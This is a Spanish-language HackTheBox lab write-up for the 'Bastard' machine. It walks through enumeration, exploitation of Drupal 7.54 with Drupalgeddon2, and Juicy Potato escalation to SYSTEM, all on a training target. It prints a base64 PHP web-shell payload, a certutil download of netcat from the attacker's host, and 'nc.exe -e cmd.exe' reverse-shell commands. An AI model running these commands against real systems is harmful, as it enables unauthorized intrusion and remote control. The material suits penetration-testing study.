---
layout: single
title: Writeup HTB - Maquina Bastard
comments: true
excerpt: "La maquina Bastard es una maquina windows - Medium, comenzamos revisando la pagina web y vemos que se esta usando un cms que es Drupal 7.54, logramos ejecutar comandos usando el exploit Drupalgeddon2. Por ultimo logramos escalamos privilegios ya que ejecutando el comando whoami /priv vemos que tenemos el privilegio SeImpersonatePrivilege activado. Por lo tanto usamos el exploit juicy potato para abusar de ese privilegio y podes escalar privilegios como nt authority system"
date: 2022-02-13
classes: wide
header:
  teaser: /assets/images/2022-02-14-writeup-maquina-htb-bastard/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Windows
  - Easy
---

# Bastard
<p align="center">
<img src="/assets/images/2022-02-14-writeup-maquina-htb-bastard/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina Bastard es una maquina windows - Medium, comenzamos revisando la pagina web y vemos que se esta usando un cms que es Drupal 7.54, logramos ejecutar comandos usando el exploit Drupalgeddon2. Por ultimo logramos escalamos privilegios ya que ejecutando el comando whoami /priv vemos que tenemos el privilegio SeImpersonatePrivilege activado. Por lo tanto usamos el exploit juicy potato para abusar de ese privilegio y podes escalar privilegios como nt authority system
</div>

## Scan Nmap
```bash
# Nmap 7.92 scan initiated Thu Feb 17 08:20:32 2022 as: nmap -sC -sV -p80,135,49154 -oN targeted -Pn -vvv 10.129.143.4
Nmap scan report for 10.129.143.4
Host is up, received user-set (0.17s latency).
Scanned at 2022-02-17 08:20:33 -05 for 67s

PORT      STATE SERVICE REASON          VERSION
80/tcp    open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 17 08:21:40 2022 -- 1 IP address (1 host up) scanned in 68.13 seconds
```

## Port 80

revisamos el puerto 80 tenemos una pagina web que usa Drupal

![Untitled](/assets/images/2022-02-14-writeup-maquina-htb-bastard/Untitled%201.png)

escaneando los directorios no nos muestre nada en especial

```bash
Bastard  ❯ feroxbuster -u http://10.129.143.4/ -w /usr/share/wordlists/dirb/common.txt -C 403 -x php,html,js,txt,bak,zip,save -a "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.143.4/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💢  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, html, js, txt, bak, zip, save]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      159l      413w     7625c http://10.129.143.4/0
301        2l       10w      152c http://10.129.143.4/includes
301        2l       10w      148c http://10.129.143.4/misc
301        2l       10w      148c http://10.129.143.4/Misc
301        2l       10w      151c http://10.129.143.4/modules
301        2l       10w      162c http://10.129.143.4/modules/aggregator
301        2l       10w      152c http://10.129.143.4/profiles
301        2l       10w      161c http://10.129.143.4/includes/database
301        2l       10w      157c http://10.129.143.4/modules/block
301        2l       10w      156c http://10.129.143.4/modules/blog
301        2l       10w      156c http://10.129.143.4/modules/Blog
301        2l       10w      156c http://10.129.143.4/modules/book
200       90l      243w     2189c http://10.129.143.4/robots.txt
301        2l       10w      151c http://10.129.143.4/Scripts
301        2l       10w      151c http://10.129.143.4/scripts
301        2l       10w      159c http://10.129.143.4/modules/contact
301        2l       10w      159c http://10.129.143.4/modules/Contact
301        2l       10w      149c http://10.129.143.4/Sites
301        2l       10w      150c http://10.129.143.4/Themes
301        2l       10w      150c http://10.129.143.4/themes
200        7l       35w     5430c http://10.129.143.4/Misc/favicon.ico
```

asi que concentro en saber la version del drupal que esta usando la pagina web, ya que nmap nos arrojo informacion sobre robots.txt revisaremos el archivo CHANGELOG.txt

```bash
Bastard # ❯ curl -s http://10.129.143.4/CHANGELOG.txt | head

Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
- Logging of searches can now be disabled (new option in the administrative
  interface).
- Added menu tree render structure to (pre-)process hooks for theme_menu_tree()
  (API addition: https://www.drupal.org/node/2827134).
- Added new function for determining whether an HTTPS request is being served
```

buscamos un exploit relacionado a Drupal 7.54

```bash
Bastard # ❯ searchsploit Drupal 7
---------------------------------------------------------------------------------------------------------------------------------------- 
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------- 
[snip]

Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution           | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution           | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)              | php/webapps/44448.py
```

descargaremos este exploit

```bash
Bastard # ❯ searchsploit -m 44448
  Exploit: Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)
      URL: https://www.exploit-db.com/exploits/44448
     Path: /usr/share/exploitdb/exploits/php/webapps/44448.py
File Type: a /usr/bin/env script, ASCII text executable

Copied to: /mnt/Pentester/Certificaciones/OSCP/WorkFolder/Plataformas/htb/Bastard/44448.py
```

probamos el exploit y nos dice que no es explotable

```bash
Bastard # ❯ python3 44448.py                                                                                                             
################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://10.129.143.4/
Not exploitable
```

pero no nos daremos por vencidos, asi que busque el mismo exploit en algun repositorio de github

```bash
https://github.com/dreadlocked/Drupalgeddon2
```

descargamos dicho exploit y nos sale el siguiente error

```bash
Bastard # ❯ git clone https://github.com/dreadlocked/Drupalgeddon2.git             
Clonando en 'Drupalgeddon2'...
remote: Enumerating objects: 257, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 257 (delta 0), reused 0 (delta 0), pack-reused 253
Recibiendo objetos: 100% (257/257), 102.12 KiB | 473.00 KiB/s, listo.
Resolviendo deltas: 100% (88/88), listo.

Bastard # ❯ cd Drupalgeddon2

Drupalgeddon2 # ❯ ruby drupalgeddon2.rb http://10.129.143.4
Traceback (most recent call last):
	2: from drupalgeddon2.rb:16:in `<main>'
	1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'
/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require': cannot load such file -- highline/import (LoadError)
```

solucionamos esto instalando la siguiente gema

```bash
Drupalgeddon2 # ❯ sudo gem install highline
Fetching highline-2.0.3.gem
Successfully installed highline-2.0.3
Parsing documentation for highline-2.0.3
Installing ri documentation for highline-2.0.3
Done installing documentation for highline after 4 seconds
1 gem installed
```

utilizamos dicho exploit y podemos ejecutar comandos en la maquina victima

```bash
Drupalgeddon2 # ❯ ruby drupalgeddon2.rb http://10.129.143.4
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.129.143.4/
--------------------------------------------------------------------------------
[+] Found  : http://10.129.143.4/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo CBJTHLDQ
[+] Result : CBJTHLDQ
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.129.143.4/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.129.143.4/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.129.143.4/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands
drupalgeddon2>> whoami
nt authority\iusr
drupalgeddon2>> hostname
Bastard
drupalgeddon2>>
```

al parecer este exploit ejecuta comandos desde una web shell hacia la terminal. Por lo tanto para obtener una reverse shell crearemos copiaremos netcat a nuestra carpeta de trabajo y crearemos un servidor web en python

```bash
Bastard # ❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

dejamos el puerto 443 en escucha con netcat

```bash
Bastard # ❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
```

en la maquina victima, creamos una carpeta dentro de la carpeta de temporales de windows y dentro de ella descargamos netcat

```bash
drupalgeddon2>> mkdir C:\Windows\Temp\abeljm

drupalgeddon2>> certutil -f -urlcache -split http://10.10.14.70/nc.exe C:\Windows\Temp\abeljm\nc.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.
```

ahora procedemos a usar netcat para que obtener una reverse shell

```bash

drupalgeddon2>> C:\Windows\Temp\abeljm\nc.exe -e cmd.exe 10.10.14.70 443
```

obteniendo una reverse shell

![Untitled](/assets/images/2022-02-14-writeup-maquina-htb-bastard/Untitled%202.png)

## Escalacion de privilegios

### Juicy Potato

si ejecutamos el comando whoami /priv vemos que tenemos activado el privilegio SeImpersonatePrivilege, lo que nos hace pensar que podemos escalar privilegios usando el exploit juicy potato

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

C:\inetpub\drupal-7.54>
```

descargamos juciy potato del siguiente repositorio

```bash
https://github.com/ohpe/juicy-potato/releases
```

creamos un servidor de samba com impacket

```bash
Bastard # ❯ impacket-smbserver shared . -smb2support                       
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

descargamos en la maquina victima la herramienta jucypotato

```bash
C:\Windows\Temp\abeljm>copy \\10.10.14.70\shared\jp.exe C:\Windows\Temp\abeljm\jp.exe
```

```bash
C:\Windows\Temp\abeljm>jp.exe -l 1337 -p cmd.exe -a "/c C:\Windows\Temp\abeljm\nc.exe -e cmd.exe 10.10.14.70 443" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
```

![Untitled](/assets/images/2022-02-14-writeup-maquina-htb-bastard/Untitled%203.png)

gracias por leer este writeup, AbelJM